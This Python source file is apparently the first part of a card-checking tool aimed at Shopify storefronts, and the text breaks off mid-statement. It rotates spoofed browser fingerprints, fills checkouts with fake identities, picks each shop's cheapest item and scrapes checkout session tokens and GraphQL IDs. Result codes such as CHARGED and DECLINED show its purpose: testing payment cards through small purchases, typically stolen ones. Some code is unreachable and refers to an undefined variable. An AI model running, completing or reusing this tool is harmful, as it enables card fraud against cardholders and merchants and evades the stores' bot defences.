import json
import random
import re
import time
import html
import urllib.parse
from typing import Dict, List, Optional, Tuple, Any
from dataclasses import dataclass, field
from enum import Enum
import sys
import os
from datetime import datetime
import threading 
import asyncio
import logging
_log = logging.getLogger("auto")
import hashlib
from pathlib import Path

from curl_cffi import requests
from curl_cffi.requests import Session, BrowserType

# ──────────────────────── config ─────────────────────────────────────

SITE_TXT = Path(__file__).parent / "site.txt"
MAX_SITE_AMOUNT = 30.0

MIN_PRODUCT_PRICE = 0.01
MAX_PRODUCT_PRICE = 15.0

BROWSER_PROFILES = [
    "chrome99", "chrome100", "chrome101", "chrome104", "chrome107", "chrome110",
    "chrome116", "chrome119", "chrome120", "chrome123", "chrome124", "chrome131", "chrome133a",
    "edge99", "edge101",
    "safari15_3", "safari15_5", "safari17_0", "safari17_2_ios", "safari18_0", "safari18_0_ios",
]

USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36 Edg/131.0.0.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36 Edg/123.0.0.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.67 Safari/537.36 Edg/101.0.1210.53",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.0 Safari/605.1.15",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Safari/605.1.15",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.5 Safari/605.1.15",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 18_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.0 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:131.0) Gecko/20100101 Firefox/131.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:123.0) Gecko/20100101 Firefox/123.0",
    "Mozilla/5.0 (X11; Linux x86_64; rv:131.0) Gecko/20100101 Firefox/131.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:131.0) Gecko/20100101 Firefox/131.0",
]

# ──────────────────────── Enums / Result types ───────────────────────

class CheckStatus(Enum):
    CHARGED  = 0
    APPROVED = 1
    DECLINED = 2
    ERROR    = 3

@dataclass
class CheckResult:
    card: str
    status: CheckStatus
    status_code: str = ""
    amount: str = ""
    currency: str = ""
    site_name: str = ""
    shop_url: str = ""
    receipt_url: str = ""
    paid_site: str = ""
    gateway: str = ""
    error: Exception = None
    retryable: bool = False

# ──────────────────────── Data models ────────────────────────────────

@dataclass
class Variant:
    id: int
    title: str
    price: str
    available: bool

@dataclass
class Product:
    id: int
    title: str
    variants: List[Variant]

@dataclass
class WorkingSite:
    url: str
    amount: float

@dataclass
class Address:
    first_name: str
    last_name: str
    address1: str
    address2: str
    city: str
    country_code: str
    zone_code: str
    postal_code: str
    phone: str
    email_domain: str = "gmail.com"

# ──────────────────────── Address database ───────────────────────────

COUNTRY_ADDRESSES: Dict[str, Address] = {
    "US":    Address("james",   "anderson",  "428 W 45th St",          "Apt 4B",    "New York",      "US", "NY",  "10036",    "+12125550100",  "gmail.com"),
    "US-CA": Address("michael", "johnson",   "123 Hollywood Blvd",     "Suite 100", "Los Angeles",   "US", "CA",  "90028",    "+13235550100",  "yahoo.com"),
    "US-TX": Address("robert",  "williams",  "456 Main St",            "",          "Houston",       "US", "TX",  "77002",    "+17135550100",  "outlook.com"),
    "US-FL": Address("david",   "brown",     "789 Ocean Dr",           "Apt 12",    "Miami",         "US", "FL",  "33139",    "+13055550100",  "hotmail.com"),
    "CA":    Address("john",    "smith",     "200 Kent St",            "",          "Ottawa",        "CA", "ON",  "K1A 0G9",  "+16135550100",  "gmail.com"),
    "CA-BC": Address("william", "davis",     "789 Granville St",       "Floor 5",   "Vancouver",     "CA", "BC",  "V6Z 1K9",  "+16045550100",  "gmail.com"),
    "MX":    Address("carlos",  "lopez",     "Av. Reforma 100",        "",          "Mexico City",   "MX", "CMX", "06000",    "+525512345678", "gmail.com"),
    "GB":    Address("james",   "wilson",    "10 Downing St",          "",          "London",        "GB", "ENG", "SW1A 2AA", "+442012345678", "gmail.com"),
    "GB-MAN":Address("oliver",  "martinez",  "123 Deansgate",          "Apt 3B",    "Manchester",    "GB", "ENG", "M3 4BQ",   "+441619876543", "outlook.com"),
    "DE":    Address("lucas",   "thomas",    "Friedrichstr 100",       "",          "Berlin",        "DE", "BE",  "10117",    "+493012345678", "gmail.com"),
    "DE-MUC":Address("felix",   "schmidt",   "Marienplatz 1",          "",          "Munich",        "DE", "BY",  "80331",    "+49891234567",  "gmail.com"),
    "FR":    Address("hugo",    "bernard",   "10 Rue de Rivoli",       "",          "Paris",         "FR", "IDF", "75001",    "+33112345678",  "gmail.com"),
    "FR-LY": Address("louis",   "petit",     "15 Rue de la République","",          "Lyon",          "FR", "ARA", "69001",    "+33487654321",  "outlook.com"),
    "IT":    Address("marco",   "rossi",     "Via Roma 1",             "",          "Rome",          "IT", "RM",  "00184",    "+39061234567",  "gmail.com"),
    "ES":    Address("carlos",  "garcia",    "Calle Mayor 1",          "",          "Madrid",        "ES", "M",   "28013",    "+34912345678",  "gmail.com"),
    "NL":    Address("bas",     "jansen",    "Dam 1",                  "",          "Amsterdam",     "NL", "NH",  "1012 JS",  "+31201234567",  "gmail.com"),
    "BE":    Address("jan",     "peeters",   "Grote Markt 1",          "",          "Brussels",      "BE", "BRU", "1000",     "+3221234567",   "gmail.com"),
    "CH":    Address("hans",    "weber",     "Bahnhofstrasse 1",       "",          "Zurich",        "CH", "ZH",  "8001",     "+41441234567",  "gmail.com"),
    "AT":    Address("markus",  "gruber",    "Stephansplatz 1",        "",          "Vienna",        "AT", "9",   "1010",     "+4312345678",   "gmail.com"),
    "SE":    Address("erik",    "andersson", "Vasagatan 1",            "",          "Stockholm",     "SE", "AB",  "111 20",   "+468123456",    "gmail.com"),
    "NO":    Address("olav",    "hansen",    "Karl Johans gate 1",     "",          "Oslo",          "NO", "03",  "0154",     "+4721234567",   "gmail.com"),
    "DK":    Address("lars",    "nielsen",   "Strøget 1",              "",          "Copenhagen",    "DK", "84",  "1457",     "+4531234567",   "gmail.com"),
    "FI":    Address("jussi",   "korhonen",  "Mannerheimintie 1",      "",          "Helsinki",      "FI", "18",  "00100",    "+35891234567",  "gmail.com"),
    "IE":    Address("sean",    "murphy",    "1 Grafton St",           "",          "Dublin",        "IE", "D",   "D02 Y006", "+35311234567",  "gmail.com"),
    "IE-CORK":Address("patrick","kelly",     "100 Patrick St",         "",          "Cork",          "IE", "CO",  "T12 XY88", "+35321456789",  "gmail.com"),
    "PT":    Address("joao",    "silva",     "Rua Augusta 1",          "",          "Lisbon",        "PT", "LIS", "1100-053", "+351211234567", "gmail.com"),
    "GR":    Address("nikos",   "papadopoulos","Ermou 1",              "",          "Athens",        "GR", "I",   "10563",    "+302101234567", "gmail.com"),
    "PL":    Address("piotr",   "kowalski",  "Nowy Swiat 1",           "",          "Warsaw",        "PL", "MZ",  "00-001",   "+48221234567",  "gmail.com"),
    "CZ":    Address("jan",     "novak",     "Vaclavske namesti 1",    "",          "Prague",        "CZ", "PR",  "110 00",   "+420212345678", "gmail.com"),
    "AU":    Address("thomas",  "taylor",    "1 George St",            "",          "Sydney",        "AU", "NSW", "2000",     "+61212345678",  "gmail.com"),
    "AU-MEL":Address("daniel",  "anderson",  "100 Collins St",         "Level 10",  "Melbourne",     "AU", "VIC", "3000",     "+61398765432",  "yahoo.com"),
    "NZ":    Address("jack",    "wilson",    "1 Queen St",             "",          "Auckland",      "NZ", "AUK", "1010",     "+6491234567",   "gmail.com"),
    "NZ-WLG":Address("liam",    "brown",     "100 Willis St",          "Floor 2",   "Wellington",    "NZ", "WGN", "6011",     "+6449876543",   "gmail.com"),
    "IN":    Address("rohan",   "singh",     "Sachin Sweets Corner Nandgram Ghukna", "", "Ghaziabad", "IN", "UP", "201003", "8826800450",    "gmail.com"),
    "JP":    Address("takashi", "yamamoto",  "1-1-1 Marunouchi",       "",          "Tokyo",         "JP", "13",  "100-0005", "+81312345678",  "gmail.com"),
    "SG":    Address("wei",     "tan",       "1 Raffles Place",        "#01-01",    "Singapore",     "SG", "01",  "048616",   "+6561234567",   "gmail.com"),
    "AE":    Address("ahmed",   "al-mansouri","Sheikh Zayed Road 1",   "",          "Dubai",         "AE", "DU",  "12345",    "+97141234567",  "gmail.com"),
    "SA":    Address("mohammed","al-ahmed",  "King Fahd Road 1",       "",          "Riyadh",        "SA", "01",  "11564",    "+966112345678", "gmail.com"),
    "IL":    Address("david",   "cohen",     "Rothschild Blvd 1",      "",          "Tel Aviv",      "IL", "TA",  "6688101",  "+97231234567",  "gmail.com"),
    "TR":    Address("mehmet",  "yilmaz",    "Istiklal Caddesi 1",     "",          "Istanbul",      "TR", "34",  "34000",    "+902121234567", "gmail.com"),
    "BR":    Address("joao",    "santos",    "Av. Paulista 1000",      "",          "Sao Paulo",     "BR", "SP",  "01310-100","+551112345678", "gmail.com"),
    "AR":    Address("juan",    "garcia",    "Av. Corrientes 1000",    "",          "Buenos Aires",  "AR", "C",   "C1043",    "+541112345678", "gmail.com"),
    "CL":    Address("pedro",   "gonzalez",  "Av. Providencia 1000",   "",          "Santiago",      "CL", "RM",  "7500000",  "+562212345678", "gmail.com"),
    "CO":    Address("andres",  "rodriguez", "Carrera 7 # 100",        "",          "Bogota",        "CO", "DC",  "110111",   "+5711234567",   "gmail.com"),
}

SHIPPING_FALLBACK_ORDER = [
    "US", "CA", "GB", "AU", "DE", "FR", "IT", "ES", "NL", "BE",
    "CH", "AT", "SE", "NO", "DK", "FI", "IE", "PT", "NZ", "JP",
    "SG", "AE", "IN", "BR", "MX", "PL", "CZ", "GR", "TR", "IL",
]

EMAIL_DOMAINS  = ["gmail.com","yahoo.com","outlook.com","hotmail.com","protonmail.com","icloud.com","aol.com","mail.com","yandex.com","proton.me"]
FIRST_NAMES    = ["james","john","robert","michael","william","david","richard","joseph","thomas","charles","mary","patricia","jennifer","linda","elizabeth","barbara","susan","jessica","sarah","karen"]
LAST_NAMES     = ["smith","johnson","williams","brown","jones","garcia","miller","davis","rodriguez","martinez","anderson","taylor","thomas","moore","jackson","martin","lee","white","harris","clark"]

def generate_random_email() -> str:
    name = random.choice(FIRST_NAMES) + random.choice(LAST_NAMES) + str(random.randint(1, 999))
    return f"{name}@{random.choice(EMAIL_DOMAINS)}"

def address_for_country(country: str) -> Address:
    if country in COUNTRY_ADDRESSES:
        return COUNTRY_ADDRESSES[country]
    base = country[:2] if len(country) > 2 else country
    if base in COUNTRY_ADDRESSES:
        return COUNTRY_ADDRESSES[base]
    return random.choice(list(COUNTRY_ADDRESSES.values()))

def get_fallback_addresses(exclude_country: str = "US") -> List[Address]:
    result = []
    for code in SHIPPING_FALLBACK_ORDER:
        if code.upper() != exclude_country.upper() and code in COUNTRY_ADDRESSES:
            result.append(COUNTRY_ADDRESSES[code])
    return result

# ──────────────────────── TLS Client ─────────────────────────────────

class TLSClient:
    def __init__(self, timeout=12, proxy_url=None, impersonate=None, user_agent=None):
        self.timeout = timeout
        if impersonate is None:
            impersonate = random.choice(BROWSER_PROFILES)
        if user_agent is None:
            user_agent = random.choice(USER_AGENTS)
        self.impersonate = impersonate
        self.user_agent  = user_agent
        self.session     = Session(impersonate=impersonate, timeout=timeout)
        
        _langs = [
            "en-US,en;q=0.9",
            "en-GB,en;q=0.9",
            "en-CA,en;q=0.9",
            "en-US,en;q=0.8",
            "en-US,en;q=0.9,es;q=0.8",
        ]
        
        self.session.headers.update({
            'User-Agent':              user_agent,
            'Accept-Language':         random.choice(_langs),
            'Accept-Encoding':         'gzip, deflate, br',
            'Accept':                  'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
            'Connection':              'keep-alive',
            'Upgrade-Insecure-Requests': '1',
            'Sec-Fetch-Dest':          'document',
            'Sec-Fetch-Mode':          'navigate',
            'Sec-Fetch-Site':          'none',
            'Sec-Fetch-User':          '?1',
            'Cache-Control':           'max-age=0',
            'DNT':                     '1',
            'Sec-GPC':                 '1',
        })
        if proxy_url:
            self.session.proxies = {'http': proxy_url, 'https': proxy_url}

    def get(self, url, **kwargs):
        kwargs.setdefault('timeout', self.timeout)
        return self.session.get(url, **kwargs)

    def post(self, url, data=None, json=None, **kwargs):
        kwargs.setdefault('timeout', self.timeout)
        return self.session.post(url, data=data, json=json, **kwargs)

    def close(self):
        self.session.close()

    def __enter__(self):
        return self

    def __exit__(self, *args):
        self.close()

# ═══════════════════════════════════════════════════════════════════
# ❌ تم حذف قسم Site fetching بالكامل (WORKING_SITES_API اتشال)
# ═══════════════════════════════════════════════════════════════════

# ═══════════════════════════════════════════════════════════════════
# Step 0: أرخص منتج — بـ 3 طرق
# ═══════════════════════════════════════════════════════════════════

_product_cache: Dict[tuple, tuple] = {}
_product_cache_lock = threading.Lock()
_PRODUCT_CACHE_TTL  = 600

MAX_PRODUCT_PAGES = 10


def _try_endpoint(client: TLSClient, url: str) -> list:
    """محاولة واحدة لجلب منتجات من endpoint"""
    try:
        resp = client.get(url)
    except Exception:
        return []
    if resp.status_code != 200:
        return []
    try:
        data = resp.json()
    except Exception:
        return []
    return data.get("products", []) if isinstance(data, dict) else []


def _fetch_products_json_page(client: TLSClient, shop_url: str, page: int = 1) -> list:
    resp = client.get(
        f"{shop_url}/products.json?sort_by=price-ascending&limit=250&page={page}"
    )
    if resp.status_code != 200:
        body = resp.text[:200].lower()
        if "cloudflare" in body or "1003" in body:
            raise Exception("cloudflare block")
        raise Exception(f"products.json returned {resp.status_code}")
    try:
        return resp.json().get("products", [])
    except Exception:
        raise Exception("products.json invalid JSON")


def _fetch_products_from_sitemap(client: TLSClient, shop_url: str) -> list:
    try:
        resp = client.get(f"{shop_url}/sitemap.xml")
        if resp.status_code != 200:
            return []
        
        product_sitemaps = re.findall(
            r'<loc>(https?://[^<]*sitemap_products[^<]*\.xml[^<]*)</loc>',
            resp.text
        )
        
        if not product_sitemaps:
            product_sitemaps = [f"{shop_url}/sitemap_products_1.xml"]
        
        products: list = []
        for sm_url in product_sitemaps[:3]:
            try:
                sm_resp = client.get(sm_url)
                if sm_resp.status_code != 200:
                    continue
                product_urls = re.findall(
                    r'<loc>(https?://[^<]*/products/[^<]+)</loc>',
                    sm_resp.text
                )
                for url in product_urls[:100]:
                    products.append({
                        "id": abs(hash(url)) % (10**10),
                        "title": url.split("/products/")[-1].split("?")[0],
                        "handle": url.split("/products/")[-1].split("?")[0],
                        "variants": [{
                            "id": abs(hash(url + "v1")) % (10**10),
                            "price": "0.00",
                            "available": True,
                        }],
                    })
            except Exception:
                continue
        
        return products
    except Exception:
        return []


def _fetch_products_from_collections(client: TLSClient, shop_url: str) -> list:
    try:
        resp = client.get(
            f"{shop_url}/collections/all/products.json?sort_by=price-ascending&limit=250"
        )
        if resp.status_code != 200:
            return []
        return resp.json().get("products", [])
    except Exception:
        return []


def _best_entry(products: list, min_price: float,
                max_price: float = MAX_PRODUCT_PRICE) -> tuple | None:
    best: tuple | None = None
    best_price = float("inf")
    for p in products:
        for v in p.get("variants", []):
            if not v.get("available", False):
                continue
            try:
                price = float(v.get("price") or 0)
            except (ValueError, TypeError):
                continue
            if price < min_price or price > max_price:
                continue
            if price < best_price:
                best_price = price
                best = (
                    p.get("title", ""),
                    str(p.get("id", "")),
                    str(v.get("id", "")),
                    v.get("price", ""),
                )
    return best


def find_cheapest_product(client: TLSClient, shop_url: str,
                          min_price: float = MIN_PRODUCT_PRICE,
                          max_price: float = MAX_PRODUCT_PRICE) -> Tuple[str, str, str, str]:
    now = time.time()
    cache_key = (shop_url, min_price, max_price)
    with _product_cache_lock:
        cached = _product_cache.get(cache_key)
        if cached and now - cached[-1] < _PRODUCT_CACHE_TTL:
            return cached[:-1]

    fast_endpoints = [
        f"{shop_url}/products.json?sort_by=price-ascending&limit=1",
        f"{shop_url}/collections/all/products.json?sort_by=price-ascending&limit=1",
        f"{shop_url}/products.json?sort_by=price-ascending&limit=5",
        f"{shop_url}/collections/all/products.json?sort_by=price-ascending&limit=5",
        f"{shop_url}/products.json?sort_by=price-ascending&limit=25",
        f"{shop_url}/collections/all/products.json?sort_by=price-ascending&limit=25",
    ]

    for url in fast_endpoints:
        products = _try_endpoint(client, url)
        if not products:
            continue
        best = _best_entry(products, min_price, max_price)
        if best:
            with _product_cache_lock:
                _product_cache[cache_key] = best + (time.time(),)
            return best

    big_endpoints = [
        f"{shop_url}/products.json?sort_by=price-ascending&limit=250",
        f"{shop_url}/collections/all/products.json?sort_by=price-ascending&limit=250",
    ]

    for url in big_endpoints:
        products = _try_endpoint(client, url)
        if not products:
            continue
        best = _best_entry(products, min_price, max_price)
        if best:
            with _product_cache_lock:
                _product_cache[cache_key] = best + (time.time(),)
            return best

    all_products: list = []
    for page in range(2, MAX_PRODUCT_PAGES + 1):
        try:
            products = _fetch_products_json_page(client, shop_url, page)
        except Exception:
            break
        if not products:
            break
        all_products.extend(products)
        if len(products) < 250:
            break

    if all_products:
        best = _best_entry(all_products, min_price, max_price)
        if best:
            with _product_cache_lock:
                _product_cache[cache_key] = best + (time.time(),)
            return best

    sm_products = _fetch_products_from_sitemap(client, shop_url)
    if sm_products:
        best = _best_entry(sm_products, min_price, max_price)
        if best:
            with _product_cache_lock:
                _product_cache[cache_key] = best + (time.time(),)
            return best

    col_products = _fetch_products_from_collections(client, shop_url)
    if col_products:
        best = _best_entry(col_products, min_price, max_price)
        if best:
            with _product_cache_lock:
                _product_cache[cache_key] = best + (time.time(),)
            return best

    raise Exception(
        f"no available products between ${min_price:.2f}-${max_price:.2f} at {shop_url}"
    )

    candidates.sort(key=lambda x: x[0])
    _price, p, v = candidates[0]

    result = (p.get("title",""), str(p.get("id","")), str(v.get("id","")), v.get("price",""))
    with _product_cache_lock:
        _product_cache[cache_key] = result + (time.time(),)
    return result


# ──────────────────────── Step 1: cart → checkout ────────────────────

def add_to_cart_and_checkout(client: TLSClient, shop_url: str, variant_id: str) -> Tuple[str, str, str, str]:
    cart_permalink = f"{shop_url}/cart/{variant_id}:1"
    checkout_resp  = client.get(cart_permalink, allow_redirects=True, headers={
        "accept":                    "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
        "accept-language":           "en-US,en;q=0.9,en-IN;q=0.8",
        "cache-control":             "no-cache",
        "pragma":                    "no-cache",
        "referer":                   shop_url + "/",
        "sec-ch-ua":                 '"Chromium";v="148", "Microsoft Edge";v="148", "Not/A)Brand";v="99"',
        "sec-ch-ua-mobile":          "?0",
        "sec-ch-ua-platform":        '"Windows"',
        "sec-fetch-dest":            "document",
        "sec-fetch-mode":            "navigate",
        "sec-fetch-site":            "same-origin",
        "sec-fetch-user":            "?1",
        "upgrade-insecure-requests": "1",
    })

    if checkout_resp.status_code not in (200, 302):
        raise Exception(f"cart permalink returned {checkout_resp.status_code}")

    checkout_url   = checkout_resp.url
    checkout_html  = checkout_resp.text

    token_match    = re.search(r'/checkouts/cn/([^/?]+)', checkout_url)
    checkout_token = token_match.group(1) if token_match else ""

    session_match  = re.search(r'<meta\s+name="serialized-sessionToken"\s+content="([^"]*)"', checkout_html)
    session_token  = html.unescape(session_match.group(1)).strip('"') if session_match else ""

    return checkout_url, checkout_token, session_token, checkout_html


# ──────────────────────── Step 2: private access token ───────────────

def extract_private_access_token_id(checkout_html: str) -> str:
    unescaped = html.unescape(checkout_html)
    match = re.search(r'"checkoutSessionIdentifier"\s*:\s*"([a-f0-9]+)"', unescaped)
    return match.group(1) if match else ""

def fetch_private_access_token(client: TLSClient, shop_url: str, checkout_url: str, pat_id: str) -> str:
    req_url = f"{shop_url}/private_access_tokens?id={urllib.parse.quote(pat_id)}&checkout_type=c1"
    headers = {
        "accept": "*/*",
        "accept-language": "en-US,en;q=0.9",
        "referer": checkout_url,
        "sec-ch-ua": '"Chromium";v="146", "Not-A.Brand";v="24", "Microsoft Edge";v="146"',
        "sec-ch-ua-mobile": "?0",
        "sec-ch-ua-platform": '"Windows"',
        "sec-fetch-dest": "empty",
        "sec-fetch-mode": "cors",
        "sec-fetch-site": "same-origin",
        "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36 Edg/146.0.0.0",
    }
    resp = client.get(req_url, headers=headers)
    return f"[{resp.status_code}] {resp.text}"


# ──────────────────────── Step 3: actions JS ─────────────────────────

def extract_actions_js_url(checkout_html: str, shop_url: str) -> str:
    match = re.search(r'(/cdn/shopifycloud/checkout-web/assets/c1/actions[A-Za-z0-9_-]*\.[A-Za-z0-9_-]+\.js)', checkout_html)
    return shop_url + match.group(1) if match else ""

def fetch_actions_js(client: TLSClient, actions_url: str, shop_url: str) -> str:
    headers = {
        "accept": "*/*",
        "accept-language": "en-US,en;q=0.9",
        "origin": shop_url,
        "priority": "u=1",
        "sec-ch-ua": '"Chromium";v="146", "Not-A.Brand";v="24", "Microsoft Edge";v="146"',
        "sec-ch-ua-mobile": "?0",
        "sec-ch-ua-platform": '"Windows"',
        "sec-fetch-dest": "script",
        "sec-fetch-mode": "cors",
        "sec-fetch-site": "same-origin",
        "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36 Edg/146.0.0.0",
    }
    resp = client.get(actions_url, headers=headers)
    if resp.status_code != 200:
        raise Exception(f"GET actions JS returned {resp.status_code}")
    return resp.text

def extract_proposal_id(js_body: str) -> str:
    match = re.search(r'id:\s*"([a-f0-9]{64})"\s*,\s*type:\s*"query"\s*,\s*name:\s*"Proposal"', js_body)
    return match.group(1) if match else ""

def extract_submit_for_completion_id(js_body: str) -> str:
    match = re.search(r'id:\s*"([a-f0-9]{64})"\s*,\s*type:\s*"mutation"\s*,\s*name:\s*"SubmitForCompletion"', js_body)
    return match.group(1) if match else ""

def extract_poll_for_receipt_id(js_body: str) -> str:
    patterns = [
        r'id:\s*"([a-f0-9]{64})"\s*,\s*type:\s*"query"\s*,\s*name:\s*"PollForReceipt"',
        r'name:\s*"PollForReceipt"\s*,\s*type:\s*"query"\s*,\s*id:\s*"([a-f0-9]{64})"',
        r'"PollForReceipt"[^}]{0,200}id:\s*"([a-f0-9]{64})"',
        r'PollForReceipt.{0,300}?([a-f0-9]{64})',
    ]
    for p in patterns:
        match = re.search(p, js_body)
        if match:
            return match.group(1)
    return ""


# ──────────────────────── Extraction helpers ─────────────────────────

def extract_queue_token(proposal_json: str) -> str:
    match = re.search(r'"queueToken"\s*:\s*"([^"]+)"', proposal_json)
    return match.group(1) if match else ""

def extract_is_shipping_required(proposal_json: str) -> bool:
    try:
        data   = json.loads(proposal_json)
        seller = (data.get("data", {})
                      .get("session", {})
                      .get("negotiate", {})
                      .get("result", {})
                      .get("sellerProposal", {}))
        return seller.get("isShippingRequired", True)
    except Exception:
        return True

def extract_stable_id(checkout_html: str) -> str:
    unescaped = html.unescape(checkout_html)
    match = re.search(r'"stableId"\s*:\s*"([0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12})"', unescaped)
    return match.group(1) if match else ""

def extract_commit_sha(checkout_html: str) -> str:
    unescaped = html.unescape(checkout_html)
    match = re.search(r'"commitSha"\s*:\s*"([a-f0-9]{40})"', unescaped)
    return match.group(1) if match else ""

def extract_source_token(checkout_html: str) -> str:
    match = re.search(r'<meta\s+name="serialized-sourceToken"\s+content="([^"]*)"', checkout_html)
    return html.unescape(match.group(1)).strip('"') if match else ""

def extract_identification_signature(checkout_html: str) -> str:
    unescaped = html.unescape(checkout_html)
    match = re.search(r'checkoutCardsinkCallerIdentificationSignature":"([^"]+)"', unescaped)
    return match.group(1) if match else ""

def extract_pci_session_id(pci_body: str) -> str:
    match = re.search(r'"id"\s*:\s*"([^"]+)"', pci_body)
    return match.group(1) if match else ""


# ✅ extract_delivery_handle — 11 طريقة
def extract_delivery_handle(proposal_body: str) -> str:
    patterns = [
        r'"selectedDeliveryStrategy"\s*:\s*\{\s*"handle"\s*:\s*"([^"]+)"\s*,\s*"__typename"\s*:\s*"CompleteDeliveryStrategy"',
        r'"selectedDeliveryStrategy"\s*:\s*\{[^{}]*?"handle"\s*:\s*"([^"]+)"',
        r'"deliveryStrategyByHandle"\s*:\s*\{\s*"handle"\s*:\s*"([^"]+)"',
        r'"deliveryHandle"\s*:\s*"([^"]+)"',
        r'"deliveryStrategyBreakdown"\s*:\s*\[\s*\{[^{}]*?"handle"\s*:\s*"([^"]+)"',
        r'"handle"\s*:\s*"([a-f0-9\-]{20,})"',
        r'"handle"\s*:\s*"([a-f0-9]{32,})"',
        r'"handle"\s*:\s*"([0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12})"',
    ]
    
    for p in patterns:
        match = re.search(p, proposal_body)
        if match:
            handle = match.group(1)
            if handle and len(handle) >= 15:
                return handle
    
    try:
        data = json.loads(proposal_body)
        seller = (data.get("data", {})
                      .get("session", {})
                      .get("negotiate", {})
                      .get("result", {})
                      .get("sellerProposal", {}))
        
        delivery = seller.get("delivery", {})
        delivery_lines = delivery.get("deliveryLines", [])
        
        for line in delivery_lines:
            sds = line.get("selectedDeliveryStrategy", {})
            if isinstance(sds, dict):
                h = sds.get("handle")
                if h and isinstance(h, str) and len(h) >= 15:
                    return h
                dsbh = sds.get("deliveryStrategyByHandle", {})
                if isinstance(dsbh, dict):
                    h = dsbh.get("handle")
                    if h and isinstance(h, str) and len(h) >= 15:
                        return h
            
            h = line.get("deliveryHandle")
            if h and isinstance(h, str) and len(h) >= 15:
                return h
        
        de = seller.get("deliveryExpectations", {})
        de_lines = de.get("deliveryExpectations", [])
        for exp in de_lines:
            if isinstance(exp, dict):
                h = exp.get("handle") or exp.get("signedHandle")
                if h and isinstance(h, str) and len(h) >= 15:
                    return h
    
    except Exception:
        pass
    
    try:
        matches = re.findall(r'handle["\s:]+([A-Za-z0-9\-_]{20,})', proposal_body)
        if matches:
            for m in matches:
                if m and len(m) >= 20:
                    return m
    except Exception:
        pass
    
    return ""

def extract_signed_handles(proposal_json: str) -> List[str]:
    try:
        data   = json.loads(proposal_json)
        seller = (data.get("data", {})
                      .get("session", {})
                      .get("negotiate", {})
                      .get("result", {})
                      .get("sellerProposal", {}))
        de          = seller.get("deliveryExpectations", {})
        de_typename = de.get("__typename", "")

        if de_typename == "FilledDeliveryExpectationTerms":
            return [x["signedHandle"] for x in de.get("deliveryExpectations", []) if x.get("signedHandle")]

        if "deliveryExpectations" in de:
            expectations = de.get("deliveryExpectations", [])
            if isinstance(expectations, list):
                handles = [x.get("signedHandle") for x in expectations if x.get("signedHandle")]
                if handles:
                    return handles

        if de_typename in ["UnfilledDeliveryExpectationTerms", "UnavailableTerms"]:
            return []

    except Exception:
        pass
    return []

def extract_shipping_amount(proposal_body: str) -> str:
    match = re.search(
